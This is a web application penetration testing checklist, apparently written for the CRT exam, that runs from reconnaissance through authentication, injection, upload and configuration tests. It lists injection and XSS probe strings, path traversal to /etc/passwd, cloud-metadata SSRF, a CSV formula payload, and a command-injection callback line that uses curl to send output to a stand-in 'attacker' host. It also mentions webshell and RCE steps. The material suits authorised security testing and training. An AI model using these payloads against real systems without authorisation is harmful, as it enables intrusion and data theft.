# Web Application Testing Methodology Checklist

A systematic, paper-style checklist to tick through during web application testing. Designed to ensure no test category is forgotten under time pressure.

For each application:
1. Run through Phase 1 (Reconnaissance) completely before moving on
2. Authenticate (Phase 2) and re-run discovery as authenticated
3. Work through Phase 3-7 systematically per endpoint/parameter

Use Burp Suite Pro throughout. Capture every request - you cannot test what you have not captured.

---

## Phase 1: Reconnaissance and Mapping

### 1.1 Initial fingerprinting

- [ ] Identified server software and version (`Server` header, error pages)
- [ ] Identified application framework (`X-Powered-By`, cookies, session names)
- [ ] Identified language/runtime (`.php`, `.aspx`, `.jsp` extensions; framework-specific cookies like `PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`)
- [ ] Ran `whatweb` and reviewed output
- [ ] Ran `nikto` for low-hanging vulnerabilities and configuration issues
- [ ] Checked `wappalyzer` browser extension on representative pages

### 1.2 Surface mapping

- [ ] Visited `/robots.txt` - noted disallowed paths (these are often most interesting)
- [ ] Visited `/sitemap.xml` - cataloguing all listed paths
- [ ] Visited `/.well-known/` - any policy or discovery files
- [ ] Visited `/security.txt` (or `/.well-known/security.txt`)
- [ ] Run directory enumeration with `ffuf` against `raft-medium-directories.txt` or similar
- [ ] Run extension enumeration (`-e .php,.html,.bak,.zip,.tar.gz,.config,.bak,.swp`)
- [ ] Run vhost enumeration (`ffuf -H "Host: FUZZ.target.com"`)
- [ ] Run DNS subdomain enumeration if applicable (`gobuster dns`)

### 1.3 Common path checks (one-shot)

Visit each of these directly:

- [ ] `/admin/`
- [ ] `/administrator/`
- [ ] `/login`, `/login.php`, `/login.html`
- [ ] `/wp-admin/`, `/wp-login.php` (WordPress)
- [ ] `/manager/html` (Tomcat)
- [ ] `/script` (Jenkins)
- [ ] `/console/` (WebLogic)
- [ ] `/.git/HEAD`, `/.git/config`
- [ ] `/.svn/entries`
- [ ] `/.env`
- [ ] `/.htaccess`, `/.htpasswd`
- [ ] `/server-status`, `/server-info` (Apache)
- [ ] `/elmah.axd`, `/Trace.axd` (.NET)
- [ ] `/web.config`, `/web.config.bak`
- [ ] `/api`, `/api/v1`, `/api/v2`
- [ ] `/swagger`, `/swagger-ui`, `/swagger.json`, `/api-docs`
- [ ] `/openapi.json`, `/openapi.yaml`
- [ ] `/graphql`, `/graphiql`, `/__graphql`
- [ ] `/phpinfo.php`, `/info.php`
- [ ] `/test.php`, `/test/`
- [ ] `/dev/`, `/staging/`, `/backup/`
- [ ] `/uploads/`, `/upload/`, `/files/`, `/images/`

### 1.4 Source review

- [ ] Viewed page source on home page and major pages
- [ ] Listed all referenced JavaScript files
- [ ] Downloaded each JS file and grep'd for:
  - [ ] API endpoints (`grep -oE "/api/[a-zA-Z0-9_/]+"`)
  - [ ] Hostnames and URLs
  - [ ] Hardcoded credentials, API keys, tokens
  - [ ] Comments referring to admin features
  - [ ] References to internal hostnames or services
- [ ] Checked HTML comments (`grep -oP '<!--.*?-->'`)
- [ ] Checked HTML for hidden form fields (`<input type="hidden">`)
- [ ] Looked for source map files (`*.js.map`) - if present, they reveal full source

### 1.5 Crawl

- [ ] Burp Suite Crawler run against the target (Site Map > right-click > Engagement Tools > Crawl)
- [ ] All discovered URLs reviewed
- [ ] All parameters across all URLs noted (Burp > Site Map > target > Engagement Tools > Analyze Target)

---

## Phase 2: Authentication & Session

### 2.1 Authentication mechanism

- [ ] Identified authentication form/endpoint
- [ ] Identified mechanism: Form-based / Basic / Digest / NTLM / Kerberos / OAuth / SAML / JWT / Custom
- [ ] Captured a valid login request in Burp Repeater for replay
- [ ] Determined what is sent: username, password, CSRF token, MFA token

### 2.2 Authentication weaknesses

- [ ] Tested **default credentials** (admin/admin, admin/password, admin/(blank), etc.)
- [ ] Tested **username enumeration** by comparing valid-user vs invalid-user error messages
- [ ] Tested **timing-based username enumeration** (response time differs for valid vs invalid users)
- [ ] Tested **rate limiting / lockout** - sent 10-20 wrong passwords for one user
- [ ] Tested **password complexity / policy** - tried `password`, `123456`, weak passwords
- [ ] Tested **password reset flow** if available:
  - [ ] Token format - random or sequential/predictable?
  - [ ] Token expiry - does it expire?
  - [ ] Token reuse - works more than once?
  - [ ] Host header injection - does email link contain attacker-controlled host?
  - [ ] Rate limiting on reset requests
  - [ ] Old password required for reset?
  - [ ] Username vs email confirmation message disclosure

### 2.3 Authentication bypass attempts

- [ ] SQL injection in username (`admin'--`, `' OR '1'='1`)
- [ ] NoSQL injection (`{"$ne": null}`)
- [ ] Parameter manipulation (`role=admin` in body, `is_admin=true` cookie)
- [ ] HTTP header bypass (`X-Original-URL: /admin`, `X-Forwarded-For: 127.0.0.1`, etc.)
- [ ] Method bypass (POST → GET, GET → POST)

### 2.4 Session management

- [ ] Identified session token (cookie name, header)
- [ ] Tested cookie attributes:
  - [ ] `Secure` flag set?
  - [ ] `HttpOnly` flag set?
  - [ ] `SameSite` value? (Strict / Lax / None)
  - [ ] Path scoped appropriately?
  - [ ] Domain scoped appropriately?
  - [ ] Expiry reasonable?
- [ ] Tested **session fixation** - does the server accept a session ID provided by the client?
- [ ] Tested **session entropy** with Burp Sequencer (collect 200+ tokens)
- [ ] Tested **session expiry** - does the session expire server-side?
- [ ] Tested **logout** - is the session genuinely invalidated server-side?
- [ ] Tested **concurrent sessions** - same account from two browsers?
- [ ] Tested **session over HTTP** - is the cookie transmitted in cleartext?

### 2.5 JWT (if used)

- [ ] Decoded the JWT (Burp Decoder, jwt.io)
- [ ] Tested **alg: none**
- [ ] Tested **HS256 with public key** (algorithm confusion)
- [ ] Tested **weak HMAC secret** with `hashcat -m 16500`
- [ ] Tested **kid header injection** for path traversal
- [ ] Tested **expired token acceptance**
- [ ] Tested **modified claims** (e.g., `"role":"admin"`)

---

## Phase 3: Authorisation

### 3.1 Vertical privilege escalation

For each authenticated role identified:

- [ ] Captured all admin endpoints with admin-level session
- [ ] Replayed those requests with lower-privilege session
- [ ] Documented which endpoints permit unauthorised access
- [ ] Documented which endpoints return data they should not

### 3.2 Horizontal privilege escalation (IDOR)

- [ ] For each parameter that references an object (user_id, account_id, file_id, etc.):
  - [ ] Incremented (+1)
  - [ ] Decremented (-1)
  - [ ] Tried 0
  - [ ] Tried negative numbers
  - [ ] Tried very large numbers
  - [ ] Tried other users' IDs
  - [ ] Tried admin user's ID
- [ ] Tried path-based IDORs (`/users/123/profile` → `/users/124/profile`)
- [ ] Tried filename IDORs (`/files/invoice_123.pdf` → other invoice numbers)
- [ ] Tried UUID guessing (predictable v1, leaked UUIDs from elsewhere)

### 3.3 Forced browsing

- [ ] Browsed directly to admin URLs without authentication
- [ ] Browsed to admin URLs with non-admin session
- [ ] Tried direct paths to functionality the UI hides
- [ ] Tested HTTP method on each endpoint (GET admin URL with POST auth, etc.)

### 3.4 Header-based bypasses

For each restricted endpoint, tried adding:

- [ ] `X-Forwarded-For: 127.0.0.1`
- [ ] `X-Real-IP: 127.0.0.1`
- [ ] `X-Forwarded-Host: localhost`
- [ ] `X-Original-URL: /admin/restricted`
- [ ] `X-Rewrite-URL: /admin/restricted`
- [ ] `Host: localhost`
- [ ] `Referer: http://target/admin/`
- [ ] `Authorization: Bearer null` / `Authorization: Bearer undefined`

### 3.5 Mass assignment / parameter tampering

- [ ] For each "update profile" / "create user" / "edit account" request:
  - [ ] Added `is_admin=true`
  - [ ] Added `role=admin`
  - [ ] Added `verified=true`
  - [ ] Added `account_balance=999999`
  - [ ] Added other privileged-looking field names

---

## Phase 4: Input Validation - Per Parameter

For **each input parameter** (URL parameters, POST body fields, headers, cookies, file uploads):

### 4.1 SQL Injection

- [ ] Sent `'` - looked for SQL error in response
- [ ] Sent `''` - looked for "syntax error near 'word'"
- [ ] Sent `' AND 1=1--` vs `' AND 1=2--` - response differs?
- [ ] Sent `' OR '1'='1` - any auth bypass?
- [ ] Sent time-based payload `'; SELECT pg_sleep(5)--` (or DBMS-appropriate)
- [ ] If suspicious, ran `sqlmap -r request.txt --batch`

### 4.2 Cross-Site Scripting (XSS)

- [ ] Sent `<script>alert(1)</script>` - reflected? Executed?
- [ ] Sent `"><script>alert(1)</script>` - if inside an attribute
- [ ] Sent `<img src=x onerror=alert(1)>` - bypasses script-tag filter
- [ ] Sent `<svg onload=alert(1)>` - shorter alternative
- [ ] Sent `'-alert(1)-'` - if inside JS context with single quotes
- [ ] Tested DOM-based: changed URL fragment with `#<script>alert(1)</script>`
- [ ] Tested stored XSS: submitted payloads, viewed where they render
- [ ] If filtered, tried filter bypasses (case variation, HTML entities, alternative tags)

### 4.3 Command Injection

- [ ] Sent `;id` - any output of `uid=`?
- [ ] Sent `|id`
- [ ] Sent `&id`
- [ ] Sent `` `id` ``
- [ ] Sent `$(id)`
- [ ] Time-based: sent `;sleep 5` - response delayed?
- [ ] Out-of-band: sent `;curl http://attacker/$(whoami)` - DNS/HTTP callback?

### 4.4 Path Traversal / LFI

- [ ] Sent `../../../etc/passwd`
- [ ] Sent `....//....//....//etc/passwd` (filter bypass)
- [ ] Sent `/etc/passwd` (absolute)
- [ ] Sent URL-encoded `..%2F..%2Fetc%2Fpasswd`
- [ ] Sent double-encoded `..%252F..%252F`
- [ ] Tried PHP wrapper `php://filter/convert.base64-encode/resource=index.php`
- [ ] Tried Windows: `..\..\..\Windows\win.ini`
- [ ] If LFI confirmed, tried log poisoning, /proc/self/environ, session file

### 4.5 SSRF

For any parameter accepting a URL:

- [ ] Sent `http://127.0.0.1/` - any response from internal service?
- [ ] Sent `http://169.254.169.254/latest/meta-data/` (AWS metadata)
- [ ] Sent `http://[::1]/`, `http://0.0.0.0/`
- [ ] Tried port scan: `http://127.0.0.1:22/`, `:6379/`, `:9200/`
- [ ] Tried filter bypasses (decimal IP, URL trickery)

### 4.6 XXE (when input is XML)

- [ ] Sent classic XXE payload reading `/etc/passwd`
- [ ] Sent blind XXE with out-of-band callback
- [ ] Tried XInclude variant if XXE blocked

### 4.7 Server-Side Template Injection (SSTI)

- [ ] Sent `{{7*7}}` - returns 49?
- [ ] Sent `${7*7}` - returns 49?
- [ ] Sent `<%= 7*7 %>` - returns 49?
- [ ] If reflected, identified template engine and used appropriate RCE payload

### 4.8 LDAP Injection (when application queries LDAP)

- [ ] Sent `*` - bypasses?
- [ ] Sent `*)(uid=*` - filter bypass
- [ ] Sent `admin)(&)` - logical operator injection

### 4.9 NoSQL Injection (when MongoDB or similar)

- [ ] Sent `{"$ne": null}` in body
- [ ] Sent `?username[$ne]=null&password[$ne]=null` in URL
- [ ] Sent `{"$where": "sleep(5000)"}` for time-based

### 4.10 HTTP Parameter Pollution

- [ ] Sent the same parameter twice (`?a=1&a=2`) - which value wins?
- [ ] Tried split logic: `?role=user&role=admin`

---

## Phase 5: Specific Functionality Tests

### 5.1 File Upload (if present)

- [ ] Identified upload endpoint and accepted formats
- [ ] Tried double extension: `shell.php.jpg`
- [ ] Tried alternate extensions: `.phtml`, `.php5`, `.phar`, `.pht`
- [ ] Tried null byte: `shell.php%00.jpg`
- [ ] Tried Content-Type spoofing in Burp
- [ ] Tried magic byte prepending (PHP code after `\xff\xd8\xff\xe0`)
- [ ] Tried EXIF metadata embedding (`exiftool -Comment='<?php ...'`)
- [ ] Tried `.htaccess` upload (Apache only)
- [ ] Tried `web.config` upload (IIS only)
- [ ] Tried SVG with embedded `<script>` for stored XSS
- [ ] Tried path traversal in filename: `../../../var/www/shell.php`
- [ ] Found upload location and confirmed shell execution

### 5.2 File Download

- [ ] For each download endpoint, tried path traversal in filename parameter
- [ ] Tried system files: `/etc/passwd`, `/etc/hosts`, `web.config`
- [ ] Tried download of `.env`, `database.yml`, `config.php`

### 5.3 Search Functionality

- [ ] SQL injection in search term
- [ ] XSS in search term (often reflected on results page)
- [ ] LDAP injection if user search

### 5.4 Email/Messaging

- [ ] SMTP injection via CRLF in email field
- [ ] Mail relay test
- [ ] Email body XSS (when displayed in admin panel)

### 5.5 Reports / Export Functionality

- [ ] CSV injection (`=cmd|'/c calc'!A1` in fields that export to CSV)
- [ ] XLSX formula injection
- [ ] PDF generation - try SSRF in image URLs, XSS in HTML-to-PDF

### 5.6 GraphQL (if present)

- [ ] Disabled introspection or enabled?
- [ ] If enabled, ran introspection query to map schema
- [ ] Looked for IDOR via mutations (`updateUser(id: 1)` → `id: 2`)
- [ ] Tried query depth attack
- [ ] Tried alias-based DoS

### 5.7 API endpoints

- [ ] Tested each endpoint without authentication
- [ ] Tried verb tampering (GET → POST, POST → DELETE)
- [ ] Looked for rate limiting on token-issuing endpoints
- [ ] Tested mass assignment via JSON body

---

## Phase 6: Cross-Site Request Forgery (CSRF)

For each state-changing action:

- [ ] Anti-CSRF token present in the request?
- [ ] Token validated server-side? (try removing it; replay)
- [ ] Token bound to session? (try one user's token in another session)
- [ ] Token reusable? (replay same token multiple times)
- [ ] SameSite cookie attribute set?
- [ ] Origin/Referer validated server-side?
- [ ] Custom header (`X-Requested-With`) required?

If CSRF protection missing or broken:
- [ ] Generated a CSRF PoC HTML (Burp: Engagement Tools > Generate CSRF PoC)
- [ ] Confirmed it executes the action

---

## Phase 7: Configuration & Information Disclosure

### 7.1 HTTP Security Headers

- [ ] `Strict-Transport-Security` (HSTS) present? `max-age` reasonable?
- [ ] `Content-Security-Policy` present? Restrictive?
- [ ] `X-Frame-Options` set? (DENY or SAMEORIGIN)
- [ ] `X-Content-Type-Options: nosniff` set?
- [ ] `Referrer-Policy` set?
- [ ] `Permissions-Policy` set?
- [ ] `X-XSS-Protection` (legacy but still checked)

### 7.2 TLS Configuration

- [ ] Ran `testssl.sh https://target.com` and reviewed
- [ ] No SSLv2, SSLv3
- [ ] No TLSv1.0, TLSv1.1
- [ ] No weak ciphers (RC4, DES, 3DES, NULL, EXPORT, anonymous)
- [ ] Cert valid (not expired, hostname match, trusted CA)
- [ ] Cert key size >= 2048 bits RSA, ECC P-256+
- [ ] Signature algorithm not MD5 / SHA-1
- [ ] No Heartbleed, POODLE, FREAK, Logjam, etc.

### 7.3 Verbose Errors

- [ ] Triggered errors and captured stack traces
- [ ] Captured database error messages (SQL syntax, table names)
- [ ] Captured framework error pages (Django DEBUG, Flask Werkzeug, Rails dev mode)
- [ ] Captured 500 errors and reviewed for information leakage

### 7.4 Backup files

For each discovered file (e.g., `index.php`), tried:

- [ ] `index.php.bak`
- [ ] `index.php~`
- [ ] `index.php.swp` (Vim)
- [ ] `index.php.old`
- [ ] `index.php.txt`
- [ ] `.index.php.swp`
- [ ] `index.php.<date>` (e.g., `index.php.20240101`)

### 7.5 Source code disclosure

- [ ] `/.git/` accessible? Used `git-dumper` to extract
- [ ] `/.svn/` accessible?
- [ ] `/.DS_Store` files leaking directory contents
- [ ] PHP misconfiguration showing source (when handler unmapped)

### 7.6 Cookie Information

- [ ] Did any cookie reveal internal information (server name, framework version)?
- [ ] Were any cookies signed but not encrypted (revealing data)?

### 7.7 Version disclosure

- [ ] HTTP `Server` header reveals software + version
- [ ] HTTP `X-Powered-By` reveals technology + version
- [ ] HTML meta `generator` tag reveals CMS version
- [ ] JavaScript libraries with version in path (`/jquery-3.4.1.min.js`)
- [ ] CMS-specific paths reveal version (`/wp-includes/version.php`, `/CHANGELOG.txt`)
- [ ] Looked up identified versions in known CVE databases

---

## Phase 8: Business Logic

This is the hardest phase to checklist - it requires understanding the application's intent. But common patterns:

- [ ] Step-skipping in multi-step workflows (jump from step 1 directly to step 3)
- [ ] Negative quantities (refund instead of charge)
- [ ] Currency manipulation (different currency in price vs total)
- [ ] Coupon code stacking (apply same code multiple times)
- [ ] Race conditions (parallel requests violating single-use limits)
- [ ] State machine violations (action permitted in wrong state)
- [ ] Quantity / limit bypasses
- [ ] Privilege boundary at workflow points (admin-only step skipped)

---

## Phase 9: Per-Application-Specific Checks

### WordPress

- [ ] Run `wpscan --url <url>` for version, plugins, users
- [ ] Visit `/?author=1` - reveals admin username
- [ ] Test `/xmlrpc.php` - if reachable, brute force via `system.multicall`
- [ ] List `/wp-content/uploads/` for accidentally-uploaded files

### Joomla

- [ ] Run `joomscan -u <url>`
- [ ] Visit `/administrator/`

### Drupal

- [ ] Run `droopescan scan drupal -u <url>`
- [ ] Check `/CHANGELOG.txt` for version
- [ ] If older Drupal, test for Drupalgeddon / Drupalgeddon2

### Tomcat

- [ ] Visit `/manager/html` - try default credentials
- [ ] Visit `/host-manager/html`
- [ ] Check AJP port 8009 (Ghostcat CVE-2020-1938)
- [ ] If creds found, deploy WAR shell

### Jenkins

- [ ] Visit `/asynchPeople/` - lists users (anonymous read often)
- [ ] Visit `/script` - if accessible, Groovy RCE
- [ ] Try `admin:admin`

### phpMyAdmin

- [ ] Try MySQL default creds (`root:`, `root:root`)
- [ ] If logged in, test `INTO OUTFILE` to upload PHP shell

### GitLab

- [ ] Visit `/users/sign_up` - is registration open?
- [ ] If reachable, check for CVE-2021-22205 (pre-auth RCE) and CVE-2023-7028 (account takeover)

### Confluence / Jira

- [ ] Identify version from `/login.action` or `/login.jsp`
- [ ] Check version against CVE-2022-26134 (Confluence) etc.

---

## Phase 10: Final Checks

- [ ] Reviewed all parameters identified in Phase 1.5 (the application analysis)
- [ ] Each finding documented with reproduction steps
- [ ] Each finding has Burp request and response captured
- [ ] Cross-referenced findings (e.g., XSS that allows CSRF token theft → chain)
- [ ] No category in this checklist left untested

---

## Time-Boxed Pass

If running tight on time, this minimal pass covers the highest-yield tests:

1. **5 min**: Surface mapping (`ffuf`, `whatweb`, robots.txt)
2. **5 min**: Try default credentials on every login form
3. **10 min**: SQL injection probes on every parameter (`'`, `OR 1=1`)
4. **10 min**: XSS on every reflective parameter (`<script>alert(1)</script>`)
5. **5 min**: IDOR on every numeric ID parameter
6. **5 min**: File upload bypass attempts (if upload exists)
7. **5 min**: Cookie/session attribute review
8. **5 min**: Verbose error provocation

This is 50 minutes and catches 70-80% of typical findings on a small application.

For the CRT exam specifically, these patterns map to specific question types - if you see "what is the password for user X" type trophy questions on a web app, the answer almost always lies behind one of: SQL injection, IDOR, file disclosure, or default creds.

---

## Burp Suite Workflow Tips

```
Workflow:
1. Browse target with Burp proxy on - capture everything in Site Map
2. For each interesting request:
   - Right-click > Send to Repeater (manual modification)
   - Right-click > Send to Intruder (automation)
3. In Repeater:
   - Modify any value
   - Click Send
   - Compare responses (right-click in response > Show Response in Browser)
4. In Intruder:
   - Set positions ($-marked)
   - Choose attack type (Sniper for one position, Cluster Bomb for many)
   - Add payloads (built-in lists, file, custom)
   - Start attack
   - Sort results by Length, Status, Time

Key shortcuts:
Ctrl+R   Send to Repeater
Ctrl+I   Send to Intruder
Ctrl+B   Send to Decoder
Ctrl+M   Match and Replace (in Proxy)
```

---

## Final Note

This checklist exists because under time pressure, testers skip steps. Tick each box explicitly, even when the answer is obvious. The two-minute investment of running through every check has saved many testers from missing a finding that turns out to be the highest-impact issue on the assessment.
